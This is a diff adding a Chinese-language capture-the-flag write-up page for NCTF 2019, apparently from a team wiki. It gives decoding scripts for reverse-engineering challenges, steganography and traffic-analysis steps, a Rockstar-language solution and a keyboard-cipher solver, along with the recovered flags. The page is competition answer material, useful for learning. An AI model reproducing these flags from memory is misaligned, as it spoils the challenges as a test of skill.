+     unsigned char* v=((unsigned char*)&amp;v0);
+     printf(&quot;0x%X 0x%X 0x%X 0x%X\n&quot;,getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3)));
+     v=((unsigned char*)&amp;v1);
+     printf(&quot;0x%X 0x%X 0x%X 0x%X\n&quot;,getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3)));
+}
+unsigned char encode(unsigned char c)
+{
+    int a=c&gt;&gt;5,b=c&lt;&lt;3;
+    return ((a|b)^0x5A);
+}
+int main()
+{
+    for(int i=0;i&lt;24;i++)
+    {
+        int c=code[i];
+        for(int j=0;j&lt;=0xFF;j++)
+            if(c==encode(j))
+            {
+                int t=j;
+                if(i==0 || i==4)
+                    t-=0xC;
+                if(i==1 || i==5)
+                    t-=0x22;
+                if(i==2 || i==6)
+                    t-=0x38;
+                if(i==3 || i==7)
+                    t-=0x4E;
+                printf(&quot;%c&quot;,t);
+            }
+    }
+    return 0;
+}
+
+</code></pre>
+
+<h3 id="f-bird">F-Bird</h3>
+<p>开历史的倒车，16位都来了
+直接看汇编，有一段异或，不过用bx寄存器高低位依次异或
+算出来两个异或的数是多少
+然后异或就行了</p>
+<pre><code>k=[0x8E,0x9D,0x94,0x98,0xBB,0x89,0xF3,0xEF,0x83,0xEE,0xAD,0x9B,0x9F,0x9A,0xF0,0xEB,0x9F,0x97,0xF6,0xBC,0xF1,0xE9,0x9F,0xE7,0xA1,0xB3,0xF3,0xA3]
+i=0
+flag=&quot;&quot;
+for c in k:
+    if(i&amp;1):
+        flag=flag+chr(c^0xde)
+    else:
+        flag=flag+chr(c^0xc0)
+    i=i+1
+print(flag)
+
+</code></pre>
+
+<h2 id="misc">Misc</h2>
+<h3 id="nctf2019">NCTF2019问卷调查</h3>
+<p>填表，填完就出flag</p>
+<h3 id="pip2-install">PiP2 install</h3>
+<blockquote>
+<p>先利用虚拟机连接一下。[图片]<img alt="" src="https://md.byr.moe/uploads/upload_2656f0c0ba7debe6c84bfee68b6b7ac7.png" />
+我已经下过了
+下载的过程中有一个链接出来了。
+win下打开它！
+存在一个setup.py
+中间有一串不知所云的字符串。
+直接base64解密就可以了</p>
+</blockquote>
+<h3 id="a_good_idea">a_good_idea</h3>
+<p>一张图片。想都不要想直接binwalk
+[图片]<img alt="" src="https://md.byr.moe/uploads/upload_f74d55dabe99fc5342f247dc442c158b.png" />
+有两张图片，hint是寻找像素的秘密。
+那就stegsolve一下combine两张图片然后左右切换通道一次就得到二维码了
+扫描即可</p>
+<h3 id="whats-this">what`s this</h3>
+<p>流量分析直接看http协议。全部导出后得到有一个zip文件包里面包含了一个what 1s th1s .txt里面格式与base64隐写很像直接py运行
+[图片]<img alt="" src="https://md.byr.moe/uploads/upload_af012d3ac5c9156110795fa9bd672426.png" />
+<img alt="" src="https://md.byr.moe/uploads/upload_136d6c5c97a89cba632a4737da4fc77d.png" /></p>
+<h3 id="become-a-rockstar">Become a Rockstar</h3>
+<p>下载得到一个rock文件
+一番~~百度~~Bing后了解到Rockstar这个编程语言
+https://github.com/RockstarLang/rockstar
+https://github.com/yyyyyyyyyyan/rockstar-py
+使用rockstar-py
+<code>rockstar-py  Become_a_Rockstar.rock</code>
+得到一段python代码</p>
+<pre><code>Leonard_Adleman = &quot;star&quot;
+Problem_Makers = 76
+Problem_Makers = &quot;NCTF{&quot;
+def God(World):
+    a_boy = &quot;flag&quot;
+    the_boy = 3
+def Evil(your_mind):
+    a_girl = &quot;no flag&quot;
+    the_girl = 5
+Truths = 3694
+Bob = &quot;ar&quot;
+Adi_Shamir = &quot;rock&quot;
+def Love(Alice, Bob):
+    Mallory = 13
+    Mallory = 24
+Everything = 114514
+Alice = &quot;you&quot;
+def Reality(God, Evil):
+    God = 26
+    Evil = 235
+Ron_Rivest = &quot;nice&quot;
+def You_Want_To(Alice, Love, Anything):
+    You = 5.75428
+your_heart = input()
+You = 5
+your_mind = input()
+Nothing = 31
+if Truths * Nothing == Everything:
+    RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman
+if Everything / Nothing == Truths:
+    Problem_Makers = Problem_Makers + Alice + Bob
+print(Problem_Makers)
+the_flag = 245
+the_confusion = 244
+print(RSA)
+Mysterious_One = &quot;}&quot;
+print(Mysterious_One)
+This = 4
+This = 35
+This = 7
+This = 3
+This = 3
+This = 37
+</code></pre>
+
+<p>跑一下flag就出来了
+NCTF{youarnicerockstar}</p>
+<h3 id="_3">小狗的秘密</h3>
+<p>又一个流量分析直接导http发现包里存在一个1.html打开都是<img alt="" src="https://md.byr.moe/uploads/upload_cf6415ea612e5793aa975de60bad41b7.png" />
+直接转txt猜测是图片RGB
+利用python脚本转成图片可最终得到flag.</p>
+<h3 id="2077">2077</h3>
+<p>直接 Google Cyberpunk 2077 stream decode.
+然后在一个 <a href="https://www.reddit.com/r/cyberpunkgame/comments/9asu1t/base64_data_from_the_stream_transmission_decoded/">reddit 帖子</a> 中，找到图片下载地址。下载后用 sha256sum 求 sha256 值即可。</p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="keyboard">keyboard</h3>
+<p>看到这里总共有8个字母，最多重复了4次，觉得就对应了手机键盘中的九宫输入法，去手试了试，前面就出来了youare，于是写了个程序码了出来</p>
+<pre><code class="c">#include &lt;cstdio&gt;
+#include &lt;cstring&gt;
+char a[100][5]={&quot;ooo&quot;,&quot;yyy&quot;,&quot;ii&quot;,&quot;w&quot;,&quot;uuu&quot;,&quot;ee&quot;,&quot;uuuu&quot;,&quot;yyy&quot;,&quot;uuuu&quot;,&quot;y&quot;,&quot;w&quot;,&quot;uuu&quot;,&quot;i&quot;,&quot;i&quot;,&quot;rr&quot;,&quot;w&quot;,&quot;i&quot;,&quot;i&quot;,&quot;rr&quot;,&quot;rrr&quot;,&quot;uuuu&quot;,&quot;rrr&quot;,&quot;uuuu&quot;,&quot;t&quot;,&quot;ii&quot;,&quot;uuuu&quot;,&quot;i&quot;,&quot;w&quot;,&quot;u&quot;,&quot;rrr&quot;,&quot;ee&quot;,&quot;www&quot;,&quot;ee&quot;,&quot;yyy&quot;,&quot;eee&quot;,&quot;www&quot;,&quot;w&quot;,&quot;tt&quot;,&quot;ee&quot;};
+char b[100][5]={&quot;w&quot;,&quot;ww&quot;,&quot;www&quot;,&quot;e&quot;,&quot;ee&quot;,&quot;eee&quot;,&quot;r&quot;,&quot;rr&quot;,&quot;rrr&quot;,&quot;t&quot;,&quot;tt&quot;,&quot;ttt&quot;,&quot;y&quot;,&quot;yy&quot;,&quot;yyy&quot;,&quot;u&quot;,&quot;uu&quot;,&quot;uuu&quot;,&quot;uuuu&quot;,&quot;i&quot;,&quot;ii&quot;,&quot;iii&quot;,&quot;o&quot;,&quot;oo&quot;,&quot;ooo&quot;,&quot;oooo&quot;};
+char c[27]=&quot;abcdefghijklmnopqrstuvwxyz&quot;;
+int main()
+{
+    for(int i=0;i&lt;=38;++i)
+    {
+        for(int j=0;j&lt;=25;++j)
+        {
+            if(strcmp(a[i],b[j])==0)
+            {
+                printf(&quot;%c&quot;,c[j]);
+                break;
+            }
+        }
+    }
+    return 0;
+}
+</code></pre>
+
+<pre><code>youaresosmartthatthisisjustapieceofcake
+</code></pre>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../.." title="Merak Wiki" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Merak Wiki
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.a8b5e56f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
